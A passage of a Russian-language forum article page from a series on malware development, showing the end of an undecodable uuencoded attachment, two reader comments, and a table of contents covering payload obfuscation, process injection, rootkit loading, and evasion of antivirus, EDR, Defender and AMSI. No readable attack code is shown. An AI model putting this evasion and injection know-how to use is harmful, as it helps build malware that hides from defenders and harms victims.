MG1G^%Z9W4-VQV@DG&quot;25XYT,B=AK-HUM%246Y$K&lt;SQ==&quot;::A,O:4Q+F9*&quot;$^&#039;
M,P9N?UZM202N0&amp;2A=&gt;$+8`OBZ8C@*&gt;\YC2B&gt;#\@;X+H5E.WYG#L%`,?+-T\!
MD.L.1ZVX:D8:2[LKP2HHD&lt;:DNR.&amp;?GB?6/\FVZD$&quot;N2VJ5))2L!_2I&#039;)S0KM
M?#U7P&#039;^@ST2Z:V(M,[*_[#.TI?8&gt;CEG41N]&quot;\2=P.X[:0OA;R?-^`?N567YP
MP&#039;[.VXYFA3O*`^ZI&amp;`&#039;ZS?C\*7=6TJZKS!.27UZ@6$A^-RMDA.57R5]?8O(Y
MH$8IDZE#7;%X[^G1^PV//-4=50W;+W&gt;^93@+EBW=69:%+%=66[HB)]NP;O*P
M35ZI;J?#]&amp;C]IF!+8?14=T!&gt;7?(&lt;?E74PO-&#039;V&gt;&#039;YE?NH-Y;H_.F&gt;W&#039;FB\\NN
MA\+/+XLR41^P!11V!.LWHO(S,XNR%#J#\@N;C!R3/])C\E/&quot;2&amp;+RT]])L/GH
MWC&#039;YM8/47#&#039;YF:L&gt;-TG=?YKF&quot;[@O4&quot;6Y^4DHZ&quot;&lt;HRA%M/U^(_?\0S?V^*KH&quot;
MT.,IZB[%Q*VHHV+B5-/-8/L/&quot;;3_3?1TET3/BICOI+4G7JLM&lt;?&#039;UYE^9ETLL
M%P!2@NP_RM).SRA5&#039;-35GZG.X-]V8?&gt;HSH6BK23.R&gt;X7*!]/9T@CZ8&#039;Q-2V9
M31(%&amp;O!2SUB]E1CWN.8.$CELUY4=JK%5_7U8_&#039;KI=*PBUM;,(/2L,#6(EA5&#039;
M&#039;&amp;&amp;JLAAX!])KU1HLD2B\YJ[V4FS[?#&#039;HW/&#039;?GB[^&gt;[7*XK^7MTI;Q1+&amp;?R]6
M%O&#039;?GN+)CO_^ASW^^Q^+^._B&quot;V]]8,:#=Z`I;SQXTG(I(T#\&#039;_8`\?RU(T`\
M:;B&lt;)V+\&#039;UZ.B/&amp;.03Y3Q/@)$&lt;F&lt;*JQQY!5PL^+(_[&amp;(([^((__7?;3U&#039;UQ.
MXT&lt;,_8Y/QOI?+&amp;UB_-=JK;JUN56$^*];E6)UL?X_Q9,K_KL6_AV)A`4]CV&lt;7
MPHEV&gt;3HDKXVWHS&amp;^_RMST??[6/F?S-=CRH!,_J^5$_ZO5$&#039;_+RWR/SS-&lt;V_^
M[U&amp;F-K@=XY-:I0#[\MPC7CSRX^1_G*W&#039;D0)9_%_9POPO1`&quot;4JY4BY&#039;\KE&lt;N+
M^.]/\CR(_WM()%Z3E(B#Z3)+&#039;?&#039;NG7`4\TI;*XY/O6[[_YYUNNV6=QK-`KG4
MP&lt;EOS5[W[/&quot;T&lt;P!!(&#039;&gt;[C&gt;Y[;^D`XLB?8CB28/#B;SP9Q78KN)A=O6;_66(2
MR4CZHH.,R0T6PBB3_RF&gt;&#039;MA&#039;!O^7-LLUSO^U4K4$^O]F=6&#039;_&gt;Y+G!Y[&gt;X6_Q
M=!&quot;.-ZY?%Y)7MS1E#[PL[!X=[4/*AE[GL&#039;/J_&gt;+M-?9/VCN%`B92^+US&quot;*D8
M@+]X1@&gt;6@6&amp;@9V&quot;(E`P,D&lt;C`\&quot;\\I+CTEFD![Y=?+%D,,&amp;&lt;&quot;&gt;20X3KMG!(RO
M!0(V9G#H&#039;?0:!ZU:M?##)/*O;GP,*1:,ILLT_=2:M_1SY[&quot;Y?]9J;Z,\F,7!
M@(B-[-*3GCP\I&lt;HHGO;BX&amp;H9&#039;&#039;IM[Y&lt;VFMW3%^_V&amp;XT&amp;J==^=]KN&#039;O::M(!G
M25_AJ7V14&lt;H_=VP]CR&gt;D8YJ,(4%$YUV]E@&lt;/\R&amp;BY\0$GL2;B!&quot;O&#039;7AX``:2
M&#039;B4$%,+1%&quot;7\,OSA1U?]-:]_3;C\)?G[\X=S1FR3B&#039;R^7%YZB6V#=^VV]^/@
MXVAI3=#7&quot;J8&lt;F&lt;RF,2NVI+Y!(&lt;G&gt;L:L`12#&amp;Y^;J_(]3_C-]_3$TP&quot;S];[-4
M$?H?60%`_]NL+NP_3_+DT_\2Y:S]#G0R2-G5V]MOO#E)4H;I7[YZ/[?&gt;&#039;S8.
M.LW=QDE[^_&quot;(L+Q+CV3$]GUIDASH[UJ7S.3_1]``,_6_2DGP_U:-VG^*&quot;_O/
MDSP+_6^A_RWTO_OJ?Z/Q]ZX&quot;6N4_GM@\W@E`MOV_RNW_6\4MS/],5H.%_&#039;^*
MY_[V/WZLMS@!^)Z?%/Y_LOU?M2CM_ZC]?[-:7O#_4SP/Y/_O[01`!OJ[WK&lt;]
MUI/)_]]^_T&lt;V@.+\;[-4VJ+[O]*&quot;_Y_BL&gt;S_\JK/B0[\5S2,_H&lt;\*?S_:!;@
M;/MO&lt;OY?0OM/N434@`7_/\&#039;S_/9?NB1_=Q9@%&gt;SO5I?(P?\/U@!R^O_A^E^L
MXOV?:KFVX/^G&gt;+[1^O_]&amp;\86S^)9/(MG\2R&gt;Q;-X%L_B63R+9_$LGK_0\_\!
(!&quot;VB[@!8`@``
`
end

|=[ EOF ]=---------------------------------------------------------------=|</code></pre>
	</div>
</div></div>
						
					

					
						

	
		
	

					
					
										

					

					
						
					

					

					

					<div class="reactionsBar js-reactionsList is-active">
						
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">Реакции:</span>
<a class="reactionsBar-link" href="reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>GoGaBoHGa</bdi>, <bdi>Tuong</bdi>, <bdi>Marat</bdi> и ещё 1 человек</a>
					</div>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</article>
			</div>
		</div>
	</div>
	
	
</div>
















	<div class="columnContainer"
		data-xf-init="lightbox"
		data-lb-id="article-6"
		data-lb-universal="0">

		<span class="u-anchorTarget" id="comments"></span>

		<div class="columnContainer-comments">
			
	
	

	<div class="block block--messages"
		data-xf-init=""
		data-type="ams_comment"
		data-href="/inline-mod/">

		
	
	


		<div class="block-outer"></div>
		
		<div class="block-container"
			data-xf-init="select-to-quote"
			data-message-selector=".js-comment">
			
			<h3 class="block-header">Комментарии</h3>
			<div class="block-body js-replyNewCommentContainer">
				
					<span class="u-anchorTarget" id="comments"></span>
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="vivty"
		data-content="ams-comment-25"
		id="js-comment-25">

		<span class="u-anchorTarget" id="ams-comment-25"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/vivty.94/">

		
			<meta itemprop="name" content="vivty" />
			
				<meta itemprop="url" content="https://osint42.org/members/vivty.94/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--s avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--xxs avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/vivty.94/" class="username " dir="auto" data-user-id="94" data-xf-init="member-tooltip"><span class="username--style2">vivty</span></a></h4>
								</li>
								<li>
									<a href="../comments/25/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-12T18:12:34+0300" data-timestamp="1749741154" data-date="12.06.2025" data-time="18:12" data-short="12 Июн" title="12.06.2025 в 18:12">12.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-25"
							data-lb-caption-desc="vivty &middot; 12.06.2025 в 18:12">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличные статьи.<br />
Спасибо!</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList ">
							
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="HMCoba"
		data-content="ams-comment-27"
		id="js-comment-27">

		<span class="u-anchorTarget" id="ams-comment-27"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/hmcoba.102/">

		
			<meta itemprop="name" content="HMCoba" />
			
				<meta itemprop="url" content="https://osint42.org/members/hmcoba.102/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--s" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1026af6.jpg?1756734897" srcset="/data/avatars/m/0/102.jpg?1756734897 2x" alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" itemprop="image" /> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--xxs" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1026af6.jpg?1756734897"  alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" /> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/hmcoba.102/" class="username " dir="auto" data-user-id="102" data-xf-init="member-tooltip"><span class="username--style2">HMCoba</span></a></h4>
								</li>
								<li>
									<a href="../comments/27/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-16T14:27:08+0300" data-timestamp="1750073228" data-date="16.06.2025" data-time="14:27" data-short="16 Июн" title="16.06.2025 в 14:27">16.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-27"
							data-lb-caption-desc="HMCoba &middot; 16.06.2025 в 14:27">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличный заход в тему Red Team. <br />
Такие статьи важны для практического понимания атакующих техник. <br />
Акцент на MDLC и реальное применение - то, чего часто не хватает. <br />
Буду следить за серией.</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	
		
			<aside class="message-signature">
			
				<div class="bbWrapper">HMCoba</div>
			
			</aside>
		
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList is-active">
							
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">Реакции:</span>
<a class="reactionsBar-link" href="../comments/27/reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>Marat</bdi></a>
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
				
			</div>
		</div>

		<div class="block-outer block-outer--after">
			
			
		</div>

		
	
	

	</div>

	
	
	

	


		</div>
	</div>	



	



		











	



	



	




	
</div>
					
				</div>

				
					<div class="p-body-sidebar">
						
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-header">ОГЛАВЛЕНИЕ</h3>
				<div class="block-body">
					<a class="blockLink " href="index.html">
						
							Зачем изучать разработку вредоносных программ ?
						
					</a>

					
						<a href="page/instrumenty.1/index.html" class="blockLink">
							 Инструменты</a>
					
						<a href="page/tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="blockLink">
							 Так какой-же язык выбрать !?</a>
					
						<a href="page/shpargalka-po-arkhitekture-vindy.3/index.html" class="blockLink">
							 Шпаргалка по архитектуре винды</a>
					
						<a href="page/chto-takoye-payload-i-shell-code.5/index.html" class="blockLink">
							 Что такое payload и shell code</a>
					
						<a href="page/izuchayem-dinamicheskiye-biblioteki.6/index.html" class="blockLink">
							 Изучаем динамические библиотеки</a>
					
						<a href="page/protsessy-windows.7/index.html" class="blockLink">
							 Процессы Windows</a>
					
						<a href="page/vidy-detektov.8/index.html" class="blockLink">
							 Виды детектов</a>
					
						<a href="page/kuda-klast-nagruzku.9/index.html" class="blockLink">
							 Куда класть нагрузку ?</a>
					
						<a href="page/shifruyem-payload.10/index.html" class="blockLink">
							 Шифруем Payload</a>
					
						<a href="page/obfuskatsiya-payload.11/index.html" class="blockLink">
							 Обфускация Payload</a>
					
						<a href="page/lokal-nyi-zapusk-payload.12/index.html" class="blockLink">
							 Локальный запуск Payload</a>
					
						<a href="page/in-yektsiya-v-protsess.13/index.html" class="blockLink">
							 Иньекция в процесс</a>
					
						<a href="page/in-yektsiya-shell-koda-v-protsess.14/index.html" class="blockLink">
							 Инъекция шелл-кода в процесс</a>
					
						<a href="page/razmeshchayem-payload-udalenno-na-servere.15/index.html" class="blockLink">
							 Размещаем Payload удаленно на сервере</a>
					
						<a href="page/pryachem-payload-v-reyestre.16/index.html" class="blockLink">
							 Прячем Payload в реестре</a>
					
						<a href="page/razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="blockLink">
							 Разборка с цифровой подписью зверька</a>
					
						<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html" class="blockLink">
							 Изучаем технику Thread Hijacking</a>
					
						<a href="page/opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="blockLink">
							 Определение PID нужного процесса, или перечисления процессов</a>
					
						<a href="page/izuchayem-tekhniku-apc-injection.20/index.html" class="blockLink">
							 Изучаем технику APC Injection</a>
					
						<a href="page/vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="blockLink">
							 Вызов кода через функции обратного вызова</a>
					
						<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="blockLink">
							 Инъекция отображаемой памяти</a>
					
						<a href="page/izuchayem-tekhniku-stomping-injection.23/index.html" class="blockLink">
							 Изучаем технику Stomping Injection</a>
					
						<a href="page/kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="blockLink">
							 Контроль выполнения полезной нагрузки</a>
					
						<a href="page/izuchayem-tekhniku-spoofing.25/index.html" class="blockLink">
							 Изучаем технику Spoofing</a>
					
						<a href="page/skrytiye-strok.26/index.html" class="blockLink">
							 Скрытие строк</a>
					
						<a href="page/izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="blockLink">
							 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
					
						<a href="page/kungfu-2-izuchayem-api-hooking.28/index.html" class="blockLink">
							 Кунгфу-2.Изучаем API Hooking</a>
					
						<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="blockLink">
							 Предельная техника. Разборка с сисколами</a>
					
						<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="blockLink">
							 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
					
						<a href="page/cherpayem-sily-v-antiotladke.31/index.html" class="blockLink">
							 Черпаем силы в антиотладке</a>
					
						<a href="page/obkhod-virtual-nykh-mashin.32/index.html" class="blockLink">
							 Обход виртуальных машин</a>
					
						<a href="page/otkryvayem-vrata-ada.33/index.html" class="blockLink">
							 Открываем врата ада</a>
					
						<a href="page/umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="blockLink">
							 Уменьшение вероятности детекта зверька</a>
					
						<a href="page/obkhod-windows-defender.35/index.html" class="blockLink">
							 Обход Windows defender</a>
					
						<a href="page/pro-endpoint-detection-and-response-edr.36/index.html" class="blockLink">
							 Про Endpoint Detection and Response (EDR)</a>
					
						<a href="page/pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="blockLink">
							 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
					
						<a href="page/ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="blockLink">
							 Огромная база исходников современных вирусов для разных платформ</a>
					
						<a href="page/kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="blockLink">
							 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
					
						<a href="page/obkhod-amsi.40/index.html" class="blockLink">
							 Обход AMSI</a>
					
						<a href="page/obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="blockLink">
							 Обход AMSI при помощи хардварных точек останова</a>
					
						<a href="page/uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="blockLink">
							 Уклоняемся от поведенческого детекта антивируса и EDR</a>
					
						<a href="page/obkhodim-antivirusy-i-edr.43/index.html" class="blockLink">
							 Обходим антивирусы и EDR</a>
					
						<a href="page/mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="blockLink">
							 MutationGate - Новый подход работы с сисколами</a>
					
						<a href="page/razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="blockLink">
							 Разработка настоящего вируса в 2024 году</a>
					

					
						<a href="index9401.html?full=1" class="blockLink is-selected">Просмотреть всю статью</a>
					
				</div>
			</div>
		</div>
						
							<div class="block">
		<div class="block-container">
			<h3 class="block-minorHeader">Информация о статье</h3>
			<div class="block-body block-row block-row--minor">
				<dl class="pairs pairs--justified">
					<dt>Автор</dt>
					
						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
					
				</dl>
				
					<dl class="pairs pairs--justified">
						<dt>Article read time</dt>
						<dd>398 min read</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>Просмотры</dt>
						<dd>9 577</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>Комментарии</dt>
						<dd>2</dd>
					</dl>
				
				
				
					<dl class="pairs pairs--justified">
						<dt>Последнее обновление</dt>
						<dd><time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time></dd>
					</dl>
				
				
				

				
			</div>
		</div>
	</div>
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-minorHeader"><a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">Больше в Уроки разработки вредоносного софта</a></h3>
				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>

			
			
			<div class="contentRow-snippet">
				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.

Вот...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../unichtozhayem-signaturnyye-antivirusy.57/index.html">Уничтожаем сигнатурные антивирусы</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно такие тулзы были популярны, возможно и сейчас будет находкой, кто занимается...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/index.html">Скрытое управление компьютером на Windows, адовая статья</a>

			
			
			<div class="contentRow-snippet">
				Статья не новая, нашел на старом форуме, но не плохо описано всё.

Возможно какие-то команды...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - Загрузка DLL из ОЗУ</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно писал свой загрузчик DLL, но сейчас на гитхабе наткнулся на более взрослый...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../pro-botnet-i-kak-delat-nel-zya.16/index.html">Про ботнет и как делать нельзя</a>

			
			
			<div class="contentRow-snippet">
				Когда-то давно участвовал в конкурсе статей на xss.is, мы решили для конкурса сделать ботнет...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
			<div class="block-container">
				
					<h3 class="block-minorHeader"><a href="../authors/0x42.1/index.html">Больше от 0x42</a></h3>
				

				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>

			
			
			<div class="contentRow-snippet">
				Недавно решил поддержать проект TOR, решил поднять middle relay.

Напомню, что для поддержки...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>

			
			
			<div class="contentRow-snippet">
				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>

			
			
			<div class="contentRow-snippet">
				---

## 🔹 Оглавление

[1. Философия UNIX: «Everything is a file»]
[2. Как работает VFS — Virtual...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>

			
			
			<div class="contentRow-snippet">
				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>

			
			
			<div class="contentRow-snippet">
				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
				<div class="block-container">
					
						<h3 class="block-minorHeader">Поделиться этой статьей</h3>
						
							<div class="block-body block-row block-row--separated">
								
									

	

	
		

		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
			<span class="u-anchorTarget" id="_xfUid-1-1758965544"></span>

			

			<div class="shareButtons-buttons">
				
					

					

					

					

					

					

					

					

					
						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965544" data-href="mailto:?subject={title}&amp;body={url}">
							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
							<span>Электронная почта</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965544"
							data-xf-init="web-share"
							data-title="" data-text="" data-url=""
							data-hide=".shareButtons-button:not(.shareButtons-button--share)">

							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
							<span>Поделиться</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965544" data-clipboard="{url}">
							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
							<span>Ссылка</span>
						</a>
					
				
			</div>
		</div>
	

								
							</div>
						
						
							<div class="block-body block-row block-row--separated">
								
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-2-1758965544">Копировать BB-код адреса статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/&quot;]Цикл статей &quot;Изучение вредоносных программ&quot;[/URL]" id="_xfUid-2-1758965544" />
		</div>
	</div>

									
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-3-1758965544">Копировать BB-код статьи</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="Скопировать в буфер обмена">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
